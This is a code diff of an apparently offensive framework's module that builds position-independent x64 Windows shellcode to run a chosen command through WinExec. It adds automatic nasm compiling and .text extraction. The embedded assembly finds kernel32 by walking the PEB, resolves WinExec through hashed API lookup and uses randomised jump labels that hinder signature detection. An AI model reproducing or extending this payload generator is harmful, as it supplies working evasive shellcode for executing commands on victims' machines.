@@ -8,8 +8,12 @@
 
 #from utils.const import variable_instruction_set
 from utils.asm import variable_instruction_set
-from utils.helper import nstate, GetFileInfo
+from utils.binary import get_coff_section
+from utils.const import nasm
 from utils.hashes import FunctionHash
+from utils.helper import nstate, GetFileInfo
+from subprocess import run
+import os
 
 CATEGORY    = 'payload'
 DESCRIPTION = 'Generate a dynamic WinExec shellcode'
@@ -18,12 +22,12 @@ def register_arguments(parser):
     parser.add_argument('-c', '--command-line', required=True, help='Command to execute with WinExec')
     parser.add_argument('-o', '--output', required=True, help='Output file')
     opt = parser.add_argument_group('additional')
-    opt.add_argument('-d', '--debug', action='store_true', default=False, help='No compile')
+    opt.add_argument('-d', '--debug', action='store_true', default=False, help='Save nasm code only')
 
 class module:
     Author = 'psycore8'
     #Description = 'Generate a dynamic WinExec shellcode'
-    Version = '0.0.5'
+    Version = '0.1.0'
     DisplayName = 'WinEXEC'
     opcode = ''
     size = 0
@@ -42,6 +46,8 @@ class module:
             'proc.try'       : f'{nstate.s_note} Try to generate shellcode',
             'proc.output_ok' : f'{nstate.s_ok} {MsgVar}',
             'proc.output_try': f'{nstate.s_note} Writing to file {self.output}',
+            'm.note'         : f'{nstate.s_note} {MsgVar}',
+            'm.ok'           : f'{nstate.s_ok} {MsgVar}',
             'error.output'   : f'{nstate.s_fail} File {self.output} not found or cannot be opened.',
             'post.done'      : f'{nstate.s_ok} DONE!'
         }
@@ -53,22 +59,42 @@ class module:
         m = self.msg
         m('pre.head')
         m('proc.try')
+        fn_root, fn_extension = os.path.splitext(self.output)
+        fn_nasm = f'{fn_root}.nasm'
+        fn_obj = f'{fn_root}.obj'
         self.opcode = self.generate_shellcode()
         if self.debug:
             m('proc.output_try')
-            if self.write_outputfile():
-                size, hash = GetFileInfo(self.output)
-                m('proc.output_ok', f'File {self.output} created\n{nstate.s_ok} Size {size} bytes\n{nstate.s_ok} Hash: {hash}')
+            if self.write_outputfile(fn_nasm):
+                size, hash = GetFileInfo(fn_nasm)
+                m('proc.output_ok', f'File {fn_nasm} created\n{nstate.s_ok} Size {size} bytes\n{nstate.s_ok} Hash: {hash}')
             else:
                 m('error.output', '', True)
         else:
-            # Autocompile etc...
-            pass
+            self.write_outputfile(fn_nasm)
+            m('m.note', 'Compiling object file')
+            run([nasm, '-f', 'win64', fn_nasm, '-o', fn_obj])
+            m('m.note', 'Extract .text section from object file')
+            sc = get_coff_section(fn_obj, '.text')
+            if self.relay_output:
+                return sc
+            else:
+                m('proc.output_try')
+                self.opcode = sc
+                if self.write_outputfile(self.output):
+                    size, hash = GetFileInfo(self.output)
+                    m('proc.output_ok', f'File {self.output} created\n{nstate.s_ok} Size {size} bytes\n{nstate.s_ok} Hash: {hash}')
+                else:
+                    m('error.output', None, True)
         m('post.done')
 
-    def write_outputfile(self):
+    def write_outputfile(self, filename):
         try:
-            with open(self.output, 'w') as f:
+            if isinstance(self.opcode, str):
+                file_flags = 'w'
+            else:
+                file_flags = 'wb'
+            with open(filename, file_flags) as f:
                 f.write(self.opcode)
             return True
         except:
@@ -89,11 +115,6 @@ class module:
             winexec_hash = fh.rol_hash('WinExec', shift_bits)
         else:
             winexec_hash = fh.ror_hash('WinExec', shift_bits)
-
-        # Generate jump identifier with wordlist: resources/wordlist_en_eff.txt
-        # jump_labels = [lb_findFuncPos=str, lb_HashLoop=str, lb_HashCompare=str, lb_WinExecFound=str, lb_InvokeWinExec=str, lb_exit=str]
-        # for label in jump_labels:
-        #     label = vi.generate_jump_label()
 
         lb_findFuncPos = vi.generate_jump_label()
         lb_HashLoop = vi.generate_jump_label()
@@ -138,7 +159,7 @@ class module:
                 mov [rbp - 38h], {rax[0]} 
 
                 ; ### find kernel32.dll base ###
-                ; peb                       = gs + 60h
+                ; peb           = gs + 60h
                 ; ldr           = peb + 18h
                 ; ModuleList    = ldr + 20h
                 ; ModuleList    -> Process
@@ -241,18 +262,27 @@ class module:
                 ; begin stacked_command
                 {stacked_command}
                 ; end stacked_command
-                mov rcx, rsp               ; rcx = command
-                mov dl, 0x1                ; uCmdSHow = SW_SHOWDEFAULT
-                and rsp, -16               ; 16-byte Stack Alignment
-                sub rsp, 32                ; STACK + 32 Bytes (shadow spaces)
-                call rax                   ; call WinExec
 
-            ; clear stack
-            add rsp, 38h                 ; local variables
-            add rsp, 18h                 ; pushes for ebp and WinExec
-            add rsp, 8h                  ; pushes for WinExec invokation
-            pop rbp
-            ret
+                ; rcx = command
+                ; uCmdSHow = SW_SHOWDEFAULT
+                ; 16-byte Stack Alignment
+                ; STACK + 32 Bytes (shadow spaces)
+                ; call WinExec
+                mov rcx, rsp               
+                mov dl, 0x1                
+                and rsp, -16               
+                sub rsp, 32                
+                call rax                   
+
+                ; clear stack
+                ; local variables
+                ; pushes for ebp and WinExec
+                ; pushes for WinExec invokation
+                add rsp, 38h                 
+                add rsp, 18h                 
+                add rsp, 8h                  
+                pop rbp
+                ret
 
             {lb_exit}:
                 ret
